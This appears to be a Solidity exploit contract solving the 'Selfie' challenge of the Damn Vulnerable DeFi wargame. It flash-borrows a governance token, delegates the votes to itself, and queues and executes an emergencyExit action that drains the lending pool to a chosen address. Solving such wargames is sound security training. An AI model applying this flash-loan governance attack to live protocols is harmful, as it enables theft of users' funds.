// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
import {SelfiePool} from "./SelfiePool.sol";
import {SimpleGovernance} from "./SimpleGovernance.sol";
import {DamnValuableVotes} from "../DamnValuableVotes.sol";

contract SelfieExploiter is IERC3156FlashBorrower {
    error OnlyOwnerCanAttack();
    error FlashLoanFailed();

    address public immutable owner;
    SelfiePool public immutable pool;
    SimpleGovernance public immutable governance;
    DamnValuableVotes public immutable token;
    uint256 public actionId;

    constructor(SelfiePool _pool, SimpleGovernance _governance) {
        owner = msg.sender;
        pool = _pool;
        governance = _governance;
        token = DamnValuableVotes(address(_pool.token()));
    }

    function attack(address recoveryAddress) external {
        if (msg.sender != owner) revert OnlyOwnerCanAttack();
        
        // Take flash loan of all available tokens
        uint256 amount = pool.maxFlashLoan(address(token));
        
        // Get voting power by delegating to self before flash loan
        token.delegate(address(this));
        
        pool.flashLoan(
            this,
            address(token),
            amount,
            abi.encode(recoveryAddress)
        );
    }

    function onFlashLoan(
        address initiator,
        address _token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        require(
            msg.sender == address(pool) && initiator == address(this),
            "Untrusted lender or initiator"
        );

        address recoveryAddress = abi.decode(data, (address));

        // Queue governance action to drain pool using flash loaned tokens
        // ERC20Votes automatically tracks voting power based on current balance
        // Queue governance action to drain pool
        actionId = governance.queueAction(
            address(pool),    // target
            uint128(0),       // value (must be uint128)
            abi.encodeWithSignature(  // data (as bytes calldata)
                "emergencyExit(address)",
                recoveryAddress
            )
        );

        // Approve repayment
        token.approve(address(pool), amount);
        
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function executeAction() external {
        if (msg.sender != owner) revert OnlyOwnerCanAttack();
        governance.executeAction(actionId);
    }
}
